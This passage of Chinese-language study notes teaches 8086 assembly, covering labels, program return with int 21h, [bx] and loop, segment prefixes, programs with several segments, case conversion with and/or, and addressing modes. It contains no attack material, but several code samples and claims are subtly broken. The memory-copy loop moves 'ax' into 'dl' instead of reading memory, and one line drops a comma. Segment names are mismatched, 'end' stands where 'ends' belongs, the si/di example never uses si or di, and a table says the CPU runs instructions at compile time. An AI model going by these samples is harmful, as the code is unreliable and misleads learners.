title="标号"></a>标号</h4><p>汇编源程序中，除了汇编指令和伪指令外，还有一些标号，比如”codesg”</p><ul><li>一个标号指代了一个地址</li><li>codesg：放在segment的前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:psych</span><br><span class="line">aaa segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">psych ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h4 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a>程序返回</h4><p>我们的程序最先以汇编指令的形式存在源程序中，经编译、连接后转变为机器码，存储在可执行文件中，那么它怎么得到运行呢？</p><ul><li>DOS中的程序运行</li></ul><p>DOS是一个单任务操作系统。一个程序P2在可执行文件中，则必须有一个正在运行的程序P1，将P2从可执行文件中加载入内存后，将CPU的控制权交给P2，P2才能得以运行。P2开始运行后，P1暂停运行。当P2运行完毕后，应该将CPU的控制权交换给它使它得以运行的程序P1，此后P1继续运行。</p><p>现在我们知道，一个程序结束后，将CPU的控制权交还给使他得以运行的程序，我们称这个过程为：程序返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;在程序的末尾天界返回的程序段。</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H  </span><br><span class="line">;这两条指令所实现的功能就是程序返回</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;段结束、程序结束、程序返回&#x3D;&#x3D;</p><table><thead><tr><th align="center">目的</th><th align="center">相关指令</th><th align="center">指令性质</th><th align="center">执行执行者</th></tr></thead><tbody><tr><td align="center">通知编译器一个段结束</td><td align="center">段名 ends</td><td align="center">伪指令</td><td align="center">编译时，由编译器执行</td></tr><tr><td align="center">通知编译器程序结束</td><td align="center">end</td><td align="center">伪指令</td><td align="center">编译时，由编译器执行</td></tr><tr><td align="center">程序返回</td><td align="center">mov ax,4c00H       int 21H</td><td align="center">汇编指令</td><td align="center">编译时，由CPU执行</td></tr></tbody></table><h1 id="BX-和loop指令"><a href="#BX-和loop指令" class="headerlink" title="[BX]和loop指令"></a>[BX]和loop指令</h1><h3 id="bx"><a href="#bx" class="headerlink" title="[bx]"></a>[bx]</h3><p><strong>[bx]</strong> 的含义：[bx]和[0]类似，同样表示一个内存单元，它的偏移地址在bx中，段地址默认在ds中</p><p><code>mov ax, [bx]</code></p><p>​功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将SA:EA处的数据送入ax中。即<code>(ax) =((ds)*16+(bx)) </code></p><p>注：在以后的课程中，我们将使用一个描述性的符号”( )”来表示一个寄存器或一个内存单元的内容。比如：(ax)表示ax中的内容、(20000H)表示2000H中的内容；</p><h3 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h3><p>英文单词’loop’有循环的含义，显然这个指令和循环有关。</p><p>loop指令的格式是：<code>loop 标号</code>，CPU执行loop指令的时候，要进行两步操作</p><ul><li>(cx) &#x3D; (cx) - 1;</li><li>判断 cx 中的值，不为零则转至标号处执行程序，如果为零则向下执行。</li></ul><p>我们可以发现，cx中的值影响着loop指令的执行结果。通常我们用loop指令来实现循环功能，cx中存放循环次数。</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>任务：编程计算2^12，结果存放在ax中。</p><p>分析：</p><p>N^2可以用N+N表示，设(ax) &#x3D; 2,(ax) &#x3D; (ax)+(ax)，</p><p>2^4可以用<code>2*2*2*2</code>表示，上一步执行得到的(ax)再次执行两次(ax) &#x3D; (ax) + (ax)</p><p>也就是2^12就是2乘11次2，总共执行11次(ax)&#x3D;(ax)+(ax);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment </span><br><span class="line">mov ax,2</span><br><span class="line"></span><br><span class="line">mov cx,11</span><br><span class="line"> s: add ax,ax</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li>程序中标号<code>s</code>实际上标示了一个地址，这个地址由一条指令：add ax,ax;</li><li>loop s 程序在执行这条指令时，先cx-1，不为零，执行标号的指令，再继续cx-1，一直到cx&#x3D;0，总共循环了10次，但是刚开始执行了一次，故总共执行了11次，正好等于cx</li></ul><h3 id="loop和-bx-的联合"><a href="#loop和-bx-的联合" class="headerlink" title="loop和[bx]的联合"></a>loop和[bx]的联合</h3><p>问题：计算ffff:0~ffff:b单元中的数据和，结果存储在dx中</p><p>分析：</p><ul><li>ffff:0<del>ffff:b中的数据都是8位的，不能直接加到寄存器dx中，而先累加到dl中设置(dh)&#x3D;0也不行，ffff:0</del>ffff:b数据范围在0~255，12个8位数据相加可能导致进位丢失</li><li>目前的方法是用一个16位的寄存器来做中介。将内存单元中的8位数据赋值到16位寄存器ax中，再将ax中的数据加到dx中，从而使这两种运算对象的类型匹配且不会发生越界</li><li>还有一个问题就是所有数据和加起来构成循环，可以使用loop来简化程序</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">mov ax,0ffffh ;在汇编源程序中，数据不能以字母开头，所以要在前面加0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0    ;初始化ds:bx指向ffff:0</span><br><span class="line">mov dx,0    ;初始化累加寄存器dx,(dx) = 0</span><br><span class="line">mov cx,12   ;初始化循环计数寄存器cx,(cx) = 12</span><br><span class="line"> s: mov al,[bx]</span><br><span class="line">mov ah,0</span><br><span class="line">add dx,ax   ;间接向dx中加上((ds)*16+(bx))单元的数值</span><br><span class="line">inc bx      ;ds:bx指向下一个单元</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="段前缀"><a href="#段前缀" class="headerlink" title="段前缀"></a>段前缀</h3><p>指令<code>mov ax,[bx]</code>中，内存单元的偏移地址由bx给出，而段地址默认在ds中。我们可以在访问内存单元的指令中显式的给出内存单元的段地址所在的段寄存器。比如：</p><ul><li><p><code>mov ax,ds:[bx]</code></p><p>将一个内存单元的内容送入ax，这个内存单元的长度为2字节，存放一个字，偏移地址在bx中，段地址在ds中。</p></li></ul><p>类似的还有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax, ds:[bx]</span><br><span class="line">mov ax, cs:[bx]</span><br><span class="line">mov ax, ss:[bx]</span><br><span class="line">mov ax, es:[bx]</span><br><span class="line">mov ax, ss:[0]</span><br><span class="line">mov ax, cs:[0]</span><br></pre></td></tr></table></figure><p>这些出现在访问内存单元的指令中，用于显示的指明内存单元的段地址的”ds”,”cs”,”ss”,”es”，在汇编语言中称为段前缀。</p><h4 id="段前缀的使用"><a href="#段前缀的使用" class="headerlink" title="段前缀的使用"></a>段前缀的使用</h4><p>问题：将内存<code>ffff:0 ~ ffff:b</code>单元中的数据复制到<code>0:200 ~ 0:20b</code>单元中。</p><p>分析：</p><ul><li>复制的过程应用循环实现<ul><li>x&#x3D;0</li><li>循环十二次：<ul><li>将ffff:x中的数据送入0020:X(需要用一个寄存器中转)</li><li>X&#x3D;X+1</li></ul></li></ul></li><li>在循环中，X是变量，我们哟bx存放</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov bx,0    ;(bx)=0,偏移地址从0开始</span><br><span class="line">mov cx,12   ;循环12次</span><br><span class="line"></span><br><span class="line">s:  mov ax,0ffffh</span><br><span class="line">mov ds,ax   ;(ds)=0fffffh</span><br><span class="line">mov dl,ax   ;(dl)=((ds)*16+(bx)),将ffff:bx中的数据传入dl</span><br><span class="line"></span><br><span class="line">mov ax,0020H</span><br><span class="line">mov ds,ax   ;(ds)=0020H</span><br><span class="line">mov [bx],dl ;((ds)*16+(bx))=(dl),将dl的数据传入0020:bx</span><br><span class="line"></span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax 4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h1 id="包含多个段的程序"><a href="#包含多个段的程序" class="headerlink" title="包含多个段的程序"></a>包含多个段的程序</h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul><li>程序取得所需空间的方式有两种，一是在加载程序的时候为程序分配，再就是程序在执行的过程中向系统申请。这里我们主要研究第一种方式，加载程序的时候为程序分配空间</li><li>我们若要一个程序在被加载的时候取得所需的空间，则必须要在源程序中作出说明。我们通过源程序中定义段来进行内存空间的获取。</li></ul><p>程序中对段名的引用，被编译器处理为一个表示段地址的数值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax, data</span><br><span class="line">mov ds, ax</span><br><span class="line">mov bx, ds:[6]</span><br></pre></td></tr></table></figure><h3 id="在代码段中使用数据"><a href="#在代码段中使用数据" class="headerlink" title="在代码段中使用数据"></a>在代码段中使用数据</h3><h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>计算8个数据的和，结果存储在AX寄存器中。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">;计算 8 个数据的和存到 ax 寄存器</span><br><span class="line">assume cs:code </span><br><span class="line"></span><br><span class="line">code segment </span><br><span class="line"></span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h ;define word 定义8个字形数据</span><br><span class="line">                                                   ;所占的内存空间大小为16个字节</span><br><span class="line"></span><br><span class="line">start:mov bx, 0  ;标号start。告诉CPU从这里开始，否则上面的dw存的数据会被当做代码</span><br><span class="line">mov ax, 0  </span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s:add ax, cs:[bx]</span><br><span class="line">add bx, 2</span><br><span class="line">loop s </span><br><span class="line"></span><br><span class="line">mov ax, 4c00h </span><br><span class="line">int 21h </span><br><span class="line">code ends</span><br><span class="line">end start    ;end除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方</span><br><span class="line">      ;用end指令指明了程序的入口在标号start处，也就是说，“mov bx，0”是程序的第一条指令。</span><br></pre></td></tr></table></figure><h3 id="在代码段中使用栈"><a href="#在代码段中使用栈" class="headerlink" title="在代码段中使用栈"></a>在代码段中使用栈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">;利用栈，将程序中定义的数据逆序存放。</span><br><span class="line">assume cs:codesg </span><br><span class="line"></span><br><span class="line">codesg segment </span><br><span class="line">dw 0123h，0456h，0789h，0abch，0defh，0fedh，0cbah，0987h ; 0-15单元</span><br><span class="line">dw 0，0，0，0，0，0，0，0，0，0，0，0，0，0，0，0 ; 16-47单元作为栈使用</span><br><span class="line"></span><br><span class="line">start:mov ax, cs </span><br><span class="line">mov ss, ax </span><br><span class="line">mov sp, 30h ;将设置栈顶ss:sp指向栈底cs:30。   30h = 48d</span><br><span class="line">mov bx, 0</span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s:push cs:[bx]</span><br><span class="line">add bx, 2</span><br><span class="line">loop s    ;以上将代码段0~15单元中的8个字型数据依次入栈</span><br><span class="line"></span><br><span class="line">mov bx, 0</span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s0:pop cs:[bx]</span><br><span class="line">add bx，2</span><br><span class="line">loop s0   ;以上依次出栈8个字型数据到代码段0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax，4c00h </span><br><span class="line">int 21h </span><br><span class="line">codesg ends </span><br><span class="line">end start;指明程序的入口在start处</span><br></pre></td></tr></table></figure><h3 id="将数据、代码、栈放入不同的段"><a href="#将数据、代码、栈放入不同的段" class="headerlink" title="将数据、代码、栈放入不同的段"></a>将数据、代码、栈放入不同的段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack    ;定义三个段</span><br><span class="line"></span><br><span class="line">data segment </span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h ;0-15单元</span><br><span class="line">data ends </span><br><span class="line"></span><br><span class="line">stack segment </span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ;0-31单元</span><br><span class="line">stack ends </span><br><span class="line"></span><br><span class="line">code segment </span><br><span class="line">start:mov ax, stack;将名称为“stack”的段的段地址送入ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov sp, 20h  ;设置栈顶ss:sp指向stack:20。 20h = 32d</span><br><span class="line"></span><br><span class="line">mov ax, data ;将名称为“data”的段的段地址送入ax</span><br><span class="line">mov ds, ax   ;ds指向data段</span><br><span class="line"></span><br><span class="line">mov bx, 0    ;ds:bx指向data段中的第一个单元</span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s:    push [bx]</span><br><span class="line">add bx, 2</span><br><span class="line">loop s       ;以上将data段中的0~15单元中的8个字型数据依次入栈</span><br><span class="line"></span><br><span class="line">mov bx, 0</span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s0:pop [bx]</span><br><span class="line">add bx, 2</span><br><span class="line">loop s0      ;以上依次出栈8个字型数据到data段的0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h </span><br><span class="line">int 21h </span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line">;“end start”说明了程序的入口，这个入口将被写入可执行文件的描述信息，</span><br><span class="line">;可执行文件中的程序被加载入内存后，CPU的CS:IP被设置指向这个入口，从而开始执行程序中的第一条指令</span><br></pre></td></tr></table></figure><h1 id="更灵活的定位内存地址的方法"><a href="#更灵活的定位内存地址的方法" class="headerlink" title="更灵活的定位内存地址的方法"></a>更灵活的定位内存地址的方法</h1><p>前面，我们用[0]、[bx]的方法，在访问内存的指令中，定位内存单元的地址。本章我们主要通过具体的问题来讲解一些更灵活的定位内存地址的方法和相关的编程方法。</p><h3 id="And和Or指令"><a href="#And和Or指令" class="headerlink" title="And和Or指令"></a>And和Or指令</h3><h4 id="And：逻辑与，按位进行与运算"><a href="#And：逻辑与，按位进行与运算" class="headerlink" title="And：逻辑与，按位进行与运算"></a>And：逻辑与，按位进行与运算</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br></pre></td></tr></table></figure><p>执行后，al&#x3D;00100011B</p><h4 id="Or：逻辑或，按位进行或运算"><a href="#Or：逻辑或，按位进行或运算" class="headerlink" title="Or：逻辑或，按位进行或运算"></a>Or：逻辑或，按位进行或运算</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">or  al,00111011B</span><br></pre></td></tr></table></figure><p>执行后，al&#x3D;01111011B</p><h4 id="应用：大小写转换"><a href="#应用：大小写转换" class="headerlink" title="应用：大小写转换"></a>应用：大小写转换</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20190321194022547.png" alt="20190321194022547" style="zoom: 80%;" /><p>小写字母的ASCII码值比大写字母的ASCII码值大20H</p><p>大写字母ASCII码的第5位为0，小写字母的第5位为1(其他一致)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg </span><br><span class="line"></span><br><span class="line">datasg segment </span><br><span class="line">db &#x27;BaSiC&#x27;</span><br><span class="line">db &#x27;iNfOrMaTion&#x27;</span><br><span class="line">datasg end</span><br><span class="line"> </span><br><span class="line">codesg segment </span><br><span class="line">start:mov ax, datasg </span><br><span class="line">mov ds, ax;设置ds 指向 datasg段</span><br><span class="line"></span><br><span class="line">mov bx, 0;设置（bx）=0，ds:bx指向’BaSic’的第一个字母</span><br><span class="line"></span><br><span class="line">mov cx, 5      ;设置循环次数5，因为’Basic&#x27;有5个字母</span><br><span class="line">s:mov al, [bx]     ;将ASCII码从ds:bx所指向的单元中取出</span><br><span class="line">and al, 11011111B;将al中的ASCII码的第5位置为0，变为大写字母</span><br><span class="line">mov [bx], al ;将转变后的ASCII码写回原单元</span><br><span class="line">inc bx     ;（bx）加1，ds:bx指向下一个字母</span><br><span class="line">loop s </span><br><span class="line"></span><br><span class="line">mov bx, 5;设置（bx）=5，ds:bx指向，iNfOrMaTion&#x27;的第一个字母</span><br><span class="line"></span><br><span class="line">mov cx, 11;设置循环次数11，因为‘iNfOrMaTion&#x27;有11个字母</span><br><span class="line">s0:mov al, [bx]</span><br><span class="line">or al, 00100000B;将a1中的ASCII码的第5位置为1，变为小写字母</span><br><span class="line">mov [bx], al </span><br><span class="line">inc bx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h </span><br><span class="line">int 21h </span><br><span class="line">codesg ends</span><br></pre></td></tr></table></figure><h3 id="bx-idata"><a href="#bx-idata" class="headerlink" title="[bx+idata]"></a>[bx+idata]</h3><p>前面，我们用[bx]的方式来指明一个内存单元，还可以用一种更为灵活的方式来指明内存单元；[bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata(bx中的数值加上idata)</p><p><code>mov ax,[bx+200]</code></p><p>含义：将一个内存单元的内容送入ax，这个内存单元的长度为2个自己(字单元)，存放一个字，偏移地址为bx总的数值加上200，段地址在ds中。</p><p>以下写法也很常见：</p><p><code>mov ax,[200+bx]</code></p><p><code>mov ax,200[bx]</code></p><p><code>mov ax,[bx].200</code></p><p>这个可以理解为数组，我们利用这个可以用更高级的结构来实现大小写转换程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg </span><br><span class="line"></span><br><span class="line">datasg segment </span><br><span class="line">db &#x27;BaSiC&#x27;;转为大写</span><br><span class="line">db &#x27;MinIx&#x27;;转为小写</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">start:</span><br><span class="line">mov ax, datasg </span><br><span class="line">mov ds, ax </span><br><span class="line">mov bx, 0  ;初始ds:bx</span><br><span class="line"></span><br><span class="line">mov cx, 5</span><br><span class="line">s:mov al, 0[bx]  </span><br><span class="line">and al, 11011111b ;转为大写字母</span><br><span class="line">mov 0[bx], al ;写回</span><br><span class="line">mov al, 5[bx]  ;[5 + bx]</span><br><span class="line">or al, 00100000b ;转为小写字母</span><br><span class="line">mov 5[bx], al </span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h </span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>对比以下汇编和C语言对数组的写法</p><p>C语言:  <code>a[i], b[i]</code></p><p>汇编:   <code>0[bx], 5[bx]</code></p><h3 id="SI和DI"><a href="#SI和DI" class="headerlink" title="SI和DI"></a>SI和DI</h3><p>si和di是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用。下面的3组指令实现了相同的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov bx,0</span><br><span class="line">mov ax,[bx]</span><br><span class="line"></span><br><span class="line">mov si,0</span><br><span class="line">mov ax,[bx]</span><br><span class="line"></span><br><span class="line">mov di,0</span><br><span class="line">mov ax,[bx]</span><br></pre></td></tr></table></figure><p>下面的三组指令也实现了相同的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov bx,0</span><br><span class="line">mov ax,[bx+123]</span><br><span class="line"></span><br><span class="line">mov si,0</span><br><span class="line">mov ax,[si+123]</span><br><span class="line"></span><br><span class="line">mov di,0</span><br><span class="line">mov ax,[di+123]</span><br></pre></td></tr></table></figure><h3 id="不同寻址方式的灵活应用"><a href="#不同寻址方式的灵活应用" class="headerlink" title="不同寻址方式的灵活应用"></a>不同寻址方式的灵活应用</h3><p>如果我们比较前面提到了几种定位内存地址的方法(可称为寻址方式)，就可以发现</p><ul><li>[idata]用一个常量表示地址，可用于直接定位一个内存单元</li><li>[bx]用一个变量来表示内存地址，可用于间接定位一个内存单元</li><li>[bx+idata]用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元</li><li>[bx+si]用两个变量表示地址</li><li>[bx+si+idata]用两个变量和一个常量表示地址</li></ul><p>一般来说，在需要暂存数据的时候，我们都应该使用栈。</p><h1 id="数据处理的两个基本问题"><a href="#数据处理的两个基本问题" class="headerlink" title="数据处理的两个基本问题"></a>数据处理的两个基本问题</h1><p>我们知道，计算机是尽心数据处理、运算的机器。那么有两个基本的问题就包含在其中：</p><ul><li>处理的数据在什么地方</li><li>要处理的数据有多长</li></ul><p>这两个问题，在机器指令中必须给以明确或隐含的说明，否则计算机就无法工作。</p><p>我们定义的描述性符号：<code>reg</code>和<code>sreg</code></p><p>为了描述上的简洁，在以后的课程中，我们将使用描述性的符号<code>reg</code>来表示一个寄存器，用<code>sreg</code>表示一个段寄存器</p><p><code>reg</code> 的集合包括：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di</p><p><code>sreg</code>的集合包括：ds、ss、cs、es</p><h3 id="bx、si、di和bp"><a href="#bx、si、di和bp" class="headerlink" title="bx、si、di和bp"></a>bx、si、di和bp</h3><p>我们进行一下总结：</p><ul><li><p>在8086CPU中，只有这4个寄存器可以在[···]中来进行内存单元的寻址</p></li><li><p>在[···]中，这4个寄存器可以单个实现，或只能以4中组合出现：<code>bx和si</code>、<code>bx和di</code>、<code>bp和si</code>、<code>bp和di</code>。</p></li><li><p>只要在[···]中使用寄存器bp，而指令中没有显性地给出段地址, 段地址就默认在ss中</p><p><code>mov ax,[bp]</code>  含义   <code>(ax)=((ss)*16+(bp))</code></p></li></ul><h3 id="汇编中数据位置的表达"><a href="#汇编中数据位置的表达" class="headerlink" title="汇编中数据位置的表达"></a>汇编中数据位置的表达</h3><p>汇编语言中用3个概念来表达数据的位置</p><ul><li>立即数(idata)</li><li>寄存器</li><li>段地址(SA)和偏移地址(EA)</li></ul><h4 id="立即数-idata"><a href="#立即数-idata" class="headerlink" title="立即数(idata)"></a>立即数(idata)</h4><p>对于直接包含在机器指令中的数据(执行前在CPU是直接指令缓冲器中)，在汇编语言中称为：立即数(idata)，在汇编指令中直接给出。例如:</p><p><code>mov ax,1</code></p><h4 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h4><p>指令要处理的数据在寄存器中，在汇编指令中给出相应的寄存器名。例如：</p><p><code>mov ax,bx</code></p><h4 id="段地址（SA）和偏移地址（EA）"><a href="#段地址（SA）和偏移地址（EA）" class="headerlink" title="段地址（SA）和偏移地址（EA）"></a>段地址（SA）和偏移地址（EA）</h4><p>指令要处理的数据在内存中，在汇编指令中可用[X]的格式给出EA，SA在某个段寄存器中。</p><ul><li>存放在段地址的寄存器可以是默认的</li><li>存放在段地址的寄存器也可以是显性给出的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov ax, [0]</span><br><span class="line">mov ax, [di]</span><br><span class="line">mov ax, [bx+8]</span><br><span class="line">mov ax, [bx+si]</span><br><span class="line">mov ax, [bx+si+8]   ;以上段地址默认在ds中</span><br><span class="line"></span><br><span class="line">mov ax, [bp]</span><br><span class="line">mov ax, [bp+8]</span><br><span class="line">mov ax, [bp+si]</span><br><span class="line">mov ax, [bp+si+8]   ;以上段地址默认在ss中</span><br><span class="line"></span><br><span class="line">mov ax, ds:[bp]</span><br><span class="line">mov ax, es:[bx]</span><br><span class="line">mov ax, ss:[bx+si]</span><br><span class="line">mov ax, cs:[bx+si+8] 